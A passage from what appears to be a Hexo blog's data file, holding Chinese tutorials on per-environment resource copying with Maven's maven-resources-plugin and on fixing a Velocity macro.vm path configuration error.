class=\"comment\">&lt;!-- 指定resources插件处理资源文件到哪个目录下 --&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;<span class=\"name\">outputDirectory</span>&gt;</span>$&#123;project.build.outputDirectory&#125;<span class=\"tag\">&lt;/<span class=\"name\">outputDirectory</span>&gt;</span></div><div class=\"line\">              <span class=\"comment\">&lt;!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） &lt;outputDirectory&gt;target/classes&lt;/outputDirectory&gt; --&gt;</span></div><div class=\"line\">              <span class=\"comment\">&lt;!-- 待处理的资源定义 --&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;<span class=\"name\">resources</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">resource</span>&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 指定resources插件处理哪个目录下的资源文件 --&gt;</span></div><div class=\"line\">                  <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/resources/$&#123;deploy.env&#125;<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 指定不需要处理的资源 &lt;excludes&gt; &lt;exclude&gt;WEB-INF/*.*&lt;/exclude&gt; &lt;/excludes&gt; --&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下配置的资源过滤是一样的，只不过可能执行的阶段不一样， </span></div><div class=\"line\">                    这里执行的阶段是插件指定的validate阶段，&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) --&gt;</div><div class=\"line\">                  <span class=\"tag\">&lt;<span class=\"name\">filtering</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">filtering</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">resource</span>&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;/<span class=\"name\">resources</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">inherited</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">inherited</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">execution</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">executions</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：对于资源拷贝问题，网上也用不少通过 maven-antrun-plugin 插件来完成资源拷贝工作，也可以参考。</p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><p><a href=\"http://www.tuicool.com/articles/JfaA7r\" target=\"_blank\" rel=\"external\">利用maven中resources插件的copy-resources目标进行资源copy和过滤</a><br><a href=\"http://maven.apache.org/plugins/maven-resources-plugin/examples/copy-resources.html\" target=\"_blank\" rel=\"external\">Copy Resources</a><br><a href=\"http://www.blogjava.net/iduido/archive/2013/03/24/396913.html\" target=\"_blank\" rel=\"external\">使用maven复制配置文件</a><br><a href=\"https://www.zybuluo.com/haokuixi/note/25985\" target=\"_blank\" rel=\"external\">Maven 如何为不同的环境打包 —— 开发、测试和产品环境</a><br><a href=\"http://www.tuicool.com/articles/bEbaIz\" target=\"_blank\" rel=\"external\">maven copy file文件到指定目录</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/maven.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、资源结构\"><a href=\"#一、资源结构\" class=\"headerlink\" title=\"一、资源结构\"></a>一、资源结构</h2><p>maven工程资源结构如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:jvwa yeshaoting$ tree src/main/resources/</div><div class=\"line\">src/main/resources/</div><div class=\"line\">├── app-db.properties</div><div class=\"line\">├── app.properties</div><div class=\"line\">├── dev</div><div class=\"line\">│   ├── app-db.properties</div><div class=\"line\">│   └── app.properties</div><div class=\"line\">├── file</div><div class=\"line\">│   ├── image.jpg</div><div class=\"line\">│   └── stage6.jsp</div><div class=\"line\">├── <span class=\"built_in\">log</span>4j.properties</div><div class=\"line\">├── model</div><div class=\"line\">│   └── UserMapper.xml</div><div class=\"line\">├── prod</div><div class=\"line\">│   ├── app-db.properties</div><div class=\"line\">│   └── app.properties</div><div class=\"line\">├── spring-beans.xml</div><div class=\"line\">├── spring-db.xml</div><div class=\"line\">└── spring-mvc.xml</div><div class=\"line\"></div><div class=\"line\">4 directories, 13 files</div></pre></td></tr></table></figure></p>\n<h2 id=\"二、需求\"><a href=\"#二、需求\" class=\"headerlink\" title=\"二、需求\"></a>二、需求</h2><p>服务部署时，希望针对于不同的环境，使用不同的配置文件。<br>针对于当前工程而言，变化的配置文件为app.properties和app-db.properties。</p>\n<p>本地环境使用：src/main/resources/ 目录下的这二个文件。<br>测试环境使用：src/main/resources/dev 目录下的这二个文件。<br>生产环境使用：src/main/resources/prod 目录下的这二个文件。</p>","more":"<h2 id=\"三、解决方案\"><a href=\"#三、解决方案\" class=\"headerlink\" title=\"三、解决方案\"></a>三、解决方案</h2><p>借助maven-resources-plugin插件，在pom.xml指定配置。<br>打包时，通过 mvn clean package -Pdev 来执行对应的环境资源拷贝工作。</p>\n<p>具体配置如下：</p>\n<h3 id=\"1-基本配置\"><a href=\"#1-基本配置\" class=\"headerlink\" title=\"1. 基本配置\"></a>1. 基本配置</h3><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">profiles</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>dev<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-resources-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.6<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">executions</span>&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;<span class=\"name\">execution</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>copy-resources<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></div><div class=\"line\">                <span class=\"comment\">&lt;!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 --&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">phase</span>&gt;</span>validate<span class=\"tag\">&lt;/<span class=\"name\">phase</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">goals</span>&gt;</span></div><div class=\"line\">                  <span class=\"tag\">&lt;<span class=\"name\">goal</span>&gt;</span>copy-resources<span class=\"tag\">&lt;/<span class=\"name\">goal</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">goals</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 指定resources插件处理资源文件到哪个目录下 --&gt;</span></div><div class=\"line\">                  <span class=\"tag\">&lt;<span class=\"name\">outputDirectory</span>&gt;</span>$&#123;project.build.outputDirectory&#125;<span class=\"tag\">&lt;/<span class=\"name\">outputDirectory</span>&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） &lt;outputDirectory&gt;target/classes&lt;/outputDirectory&gt; --&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 待处理的资源定义 --&gt;</span></div><div class=\"line\">                  <span class=\"tag\">&lt;<span class=\"name\">resources</span>&gt;</span></div><div class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">resource</span>&gt;</span></div><div class=\"line\">                      <span class=\"comment\">&lt;!-- 指定resources插件处理哪个目录下的资源文件 --&gt;</span></div><div class=\"line\">                      <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/resources/dev<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></div><div class=\"line\">                      <span class=\"comment\">&lt;!-- 指定不需要处理的资源 &lt;excludes&gt; &lt;exclude&gt;WEB-INF/*.*&lt;/exclude&gt; &lt;/excludes&gt; --&gt;</span></div><div class=\"line\">                      <span class=\"comment\">&lt;!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下配置的资源过滤是一样的，只不过可能执行的阶段不一样，这里执行的阶段是插件指定的validate阶段，&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) --&gt;</span></div><div class=\"line\">                      <span class=\"tag\">&lt;<span class=\"name\">filtering</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">filtering</span>&gt;</span></div><div class=\"line\">                    <span class=\"tag\">&lt;/<span class=\"name\">resource</span>&gt;</span></div><div class=\"line\">                  <span class=\"tag\">&lt;/<span class=\"name\">resources</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">inherited</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">inherited</span>&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;/<span class=\"name\">execution</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">executions</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">profiles</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"2-改进配置\"><a href=\"#2-改进配置\" class=\"headerlink\" title=\"2. 改进配置\"></a>2. 改进配置</h3><p>对于上面的配置，如果有prod, dev, local三类环境的话，则需要在对应的profile节点下添加三次build的配置。我们可以观察到针对不同的环境只是directory节点内容不同而已，可以使用一个变更代替就好了。</p>\n<p>我们在profile节点下添加properties属性，使用<code>deploy.env</code>来代替不同的环境目录名。于是改进后的配置如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">profiles</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>dev<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">deploy.env</span>&gt;</span>dev<span class=\"tag\">&lt;/<span class=\"name\">deploy.env</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>prod<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">deploy.env</span>&gt;</span>prod<span class=\"tag\">&lt;/<span class=\"name\">deploy.env</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">profiles</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-resources-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.6<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">executions</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">execution</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>copy-resources<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></div><div class=\"line\">            <span class=\"comment\">&lt;!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 --&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">phase</span>&gt;</span>validate<span class=\"tag\">&lt;/<span class=\"name\">phase</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">goals</span>&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;<span class=\"name\">goal</span>&gt;</span>copy-resources<span class=\"tag\">&lt;/<span class=\"name\">goal</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">goals</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></div><div class=\"line\">              <span class=\"comment\">&lt;!-- 指定resources插件处理资源文件到哪个目录下 --&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;<span class=\"name\">outputDirectory</span>&gt;</span>$&#123;project.build.outputDirectory&#125;<span class=\"tag\">&lt;/<span class=\"name\">outputDirectory</span>&gt;</span></div><div class=\"line\">              <span class=\"comment\">&lt;!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） &lt;outputDirectory&gt;target/classes&lt;/outputDirectory&gt; --&gt;</span></div><div class=\"line\">              <span class=\"comment\">&lt;!-- 待处理的资源定义 --&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;<span class=\"name\">resources</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">resource</span>&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 指定resources插件处理哪个目录下的资源文件 --&gt;</span></div><div class=\"line\">                  <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/resources/$&#123;deploy.env&#125;<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 指定不需要处理的资源 &lt;excludes&gt; &lt;exclude&gt;WEB-INF/*.*&lt;/exclude&gt; &lt;/excludes&gt; --&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下配置的资源过滤是一样的，只不过可能执行的阶段不一样， </div><div class=\"line\">                    这里执行的阶段是插件指定的validate阶段，&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) --&gt;</span></div><div class=\"line\">                  <span class=\"tag\">&lt;<span class=\"name\">filtering</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">filtering</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">resource</span>&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;/<span class=\"name\">resources</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">inherited</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">inherited</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">execution</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">executions</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：对于资源拷贝问题，网上也用不少通过 maven-antrun-plugin 插件来完成资源拷贝工作，也可以参考。</p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><p><a href=\"http://www.tuicool.com/articles/JfaA7r\">利用maven中resources插件的copy-resources目标进行资源copy和过滤</a><br><a href=\"http://maven.apache.org/plugins/maven-resources-plugin/examples/copy-resources.html\">Copy Resources</a><br><a href=\"http://www.blogjava.net/iduido/archive/2013/03/24/396913.html\">使用maven复制配置文件</a><br><a href=\"https://www.zybuluo.com/haokuixi/note/25985\">Maven 如何为不同的环境打包 —— 开发、测试和产品环境</a><br><a href=\"http://www.tuicool.com/articles/bEbaIz\">maven copy file文件到指定目录</a></p>"},{"title":"velocity宏文件macro.vm缺失","date":"2015-12-29T05:58:00.000Z","_content":"<img src=\"/asserts/images/logo/velocity.png\" class=\"img-logo img-center\" />\n\n\n异常描述：VelocityException: Velocimacro : Error using VM library : /WEB-INF/vm/macro.vm\n问题原因：路径配置错误。\n\n\n## 一、项目相关配置\n\n### 1. spring-beans.xml\nspring bean velocityEngine\n``` xml\n  <bean id=\"velocityEngine\" class=\"org.springframework.ui.velocity.VelocityEngineFactoryBean\">\n    <property name=\"resourceLoaderPath\" value=\"/WEB-INF/vm/\"/>\n    <property name=\"configLocation\" value=\"classpath:velocity.properties\"/>\n  </bean>\n```\n\n### 2. velocity.properties\n宏资源文件配置\n``` properties\nvelocimacro.library=/WEB-INF/vm/macro.vm\n```\n\n\n<!-- more -->\n\n\n## 二、解析异常原因\n首先，默认velocity模板加载方式为file，对应的资源加载类为：`org.apache.velocity.runtime.resource.loader.FileResourceLoader`。参见如下 **模板加载配置** 以及 **FileResourceLoader说明** 。\n\n从模板目录/WEB-INF/vm/加载模块文件(`ResourceManagerImpl.getResource`)。\n\n如果模板文件没有缓存(`ResourceManagerImpl.globalCacheglobalCache`)，则从目录文件中加载(`ResourceManagerImpl.loadResource`)。\n\n加载过程中，加载资源文件流，解析并初始化。`org.apache.velocity.Template.process()`\n此时，调用资源文件加载类FileResourceLoader加载文件。\n\nFileResourceLoader在file.resource.loader.path目录，即spring-beans.xml中配置的resourceLoaderPath目录通过模板名查找并加载模板。\n如果resourceLoaderPath未配置或者为空的话，则通过绝对路径加载模板；否则，相对于resourceLoaderPath查找模板。\n如果resourceLoaderPath不为空，模板路径velocimacro.library以/开头，则直接去除/。\n\n### 模板加载配置\n默认的velocity.properties in package `org.apache.velocity.runtime.defaults`。\n``` properties\nresource.loader = file\n\nfile.resource.loader.description = Velocity File Resource Loader\nfile.resource.loader.class = org.apache.velocity.runtime.resource.loader.FileResourceLoader\nfile.resource.loader.path = .\nfile.resource.loader.cache = false\nfile.resource.loader.modificationCheckInterval = 2\n```\n\n### FileResourceLoader说明\nA loader for templates stored on the file system. Treats the template as relative to the configured root path. If the root path is empty treats the template name as an absolute path.\n\n\n## 三、小结\n因此，对于当前的项目配置来说，velocity框架实际上是在/WEB-INF/vm/WEB-INF/vm/macro.vm目录加载模板文件macro.vm。\n\n**注**：如果希望在class目录加载模板文件，可以考试设置资源文件加载类为：org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader。\n\n修改velocity.properties配置：\n``` properties\nresource.loader = class\nclass.resource.loader.class = org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader\n\nvelocimacro.library=macro.vm\n```\n\n## 四、参考文档\nhttp://stackoverflow.com/questions/3443819/velocity-cant-find-resource\nhttp://velocity.apache.org/engine/releases/velocity-1.6.4/developer-guide.html#Configuring_Resource_Loaders\nhttp://velocity.apache.org/engine/releases/velocity-1.6.4/apidocs/org/apache/velocity/runtime/resource/loader/ClasspathResourceLoader.html","source":"_posts/article/java/velocity宏文件macro.vm缺失.md","raw":"tags:\n  - velocity\n  - java\ntitle: velocity宏文件macro.vm缺失\ncategories:\n  - 后端开发\ndate: 2015-12-29 13:58:00\n---\n<img src=\"/asserts/images/logo/velocity.png\" class=\"img-logo img-center\" />\n\n\n异常描述：VelocityException: Velocimacro : Error using VM library : /WEB-INF/vm/macro.vm\n问题原因：路径配置错误。\n\n\n## 一、项目相关配置\n\n### 1. spring-beans.xml\nspring bean velocityEngine\n``` xml\n  <bean id=\"velocityEngine\" class=\"org.springframework.ui.velocity.VelocityEngineFactoryBean\">\n    <property name=\"resourceLoaderPath\" value=\"/WEB-INF/vm/\"/>\n    <property name=\"configLocation\" value=\"classpath:velocity.properties\"/>\n  </bean>\n```\n\n### 2. velocity.properties\n宏资源文件配置\n``` properties\nvelocimacro.library=/WEB-INF/vm/macro.vm\n```\n\n\n<!-- more -->\n\n\n## 二、解析异常原因\n首先，默认velocity模板加载方式为file，对应的资源加载类为：`org.apache.velocity.runtime.resource.loader.FileResourceLoader`。参见如下 **模板加载配置** 以及 **FileResourceLoader说明** 。\n\n从模板目录/WEB-INF/vm/加载模块文件(`ResourceManagerImpl.getResource`)。\n\n如果模板文件没有缓存(`ResourceManagerImpl.globalCacheglobalCache`)，则从目录文件中加载(`ResourceManagerImpl.loadResource`)。\n\n加载过程中，加载资源文件流，解析并初始化。`org.apache.velocity.Template.process()`\n此时，调用资源文件加载类FileResourceLoader加载文件。\n\nFileResourceLoader在file.resource.loader.path目录，即spring-beans.xml中配置的resourceLoaderPath目录通过模板名查找并加载模板。\n如果resourceLoaderPath未配置或者为空的话，则通过绝对路径加载模板；否则，相对于resourceLoaderPath查找模板。\n如果resourceLoaderPath不为空，模板路径velocimacro.library以/开头，则直接去除/。\n\n### 模板加载配置\n默认的velocity.properties in package `org.apache.velocity.runtime.defaults`。\n``` properties\nresource.loader = file\n\nfile.resource.loader.description = Velocity File Resource Loader\nfile.resource.loader.class = org.apache.velocity.runtime.resource.loader.FileResourceLoader\nfile.resource.loader.path = .\nfile.resource.loader.cache = false\nfile.resource.loader.modificationCheckInterval = 2\n```\n\n### FileResourceLoader说明\nA loader for templates stored on the file system. Treats the template as relative to the configured root path. If the root path is empty treats the template name as an absolute path.\n\n\n## 三、小结\n因此，对于当前的项目配置来说，velocity框架实际上是在/WEB-INF/vm/WEB-INF/vm/macro.vm目录加载模板文件macro.vm。\n\n**注**：如果希望在class目录加载模板文件，可以考试设置资源文件加载类为：org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader。\n\n修改velocity.properties配置：\n``` properties\nresource.loader = class\nclass.resource.loader.class = org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader\n\nvelocimacro.library=macro.vm\n```\n\n## 四、参考文档\nhttp://stackoverflow.com/questions/3443819/velocity-cant-find-resource\nhttp://velocity.apache.org/engine/releases/velocity-1.6.4/developer-guide.html#Configuring_Resource_Loaders\nhttp://velocity.apache.org/engine/releases/velocity-1.6.4/apidocs/org/apache/velocity/runtime/resource/loader/ClasspathResourceLoader.html","slug":"article/java/velocity宏文件macro.vm缺失","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxrw00325nbt6q5gunas","content":"<p><img src=\"/asserts/images/logo/velocity.png\" class=\"img-logo img-center\"></p>\n<p>异常描述：VelocityException: Velocimacro : Error using VM library : /WEB-INF/vm/macro.vm<br>问题原因：路径配置错误。</p>\n<h2 id=\"一、项目相关配置\"><a href=\"#一、项目相关配置\" class=\"headerlink\" title=\"一、项目相关配置\"></a>一、项目相关配置</h2><h3 id=\"1-spring-beans-xml\"><a href=\"#1-spring-beans-xml\" class=\"headerlink\" title=\"1. spring-beans.xml\"></a>1. spring-beans.xml</h3><p>spring bean velocityEngine<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"velocityEngine\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.ui.velocity.VelocityEngineFactoryBean\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"resourceLoaderPath\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"/WEB-INF/vm/\"</span>/&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"configLocation\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"classpath:velocity.properties\"</span>/&gt;</span></div><div class=\"line\"><span 